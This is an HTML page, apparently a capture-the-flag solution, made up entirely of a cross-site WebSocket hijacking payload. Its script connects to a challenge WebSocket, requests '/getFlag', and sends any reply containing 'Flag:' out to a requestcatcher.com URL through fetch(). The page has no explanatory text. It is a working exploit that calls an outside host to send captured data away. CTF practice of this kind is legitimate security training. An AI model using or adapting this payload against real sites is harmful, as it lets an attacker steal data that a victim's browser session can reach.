<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <script>

         const ws = new WebSocket('wss://wembsoncket.chal.cyberjousting.com/');
      ws.onopen = () => {
        ws.send(JSON.stringify({ message: '/getFlag' }));
      };
      ws.onmessage = (event) => {
        if (event.data.includes('Flag:')) {
          fetch('https://cookie.requestcatcher.com/test?flag=' + encodeURIComponent(event.data));
        }
      };
    </script>
</body>
</html>
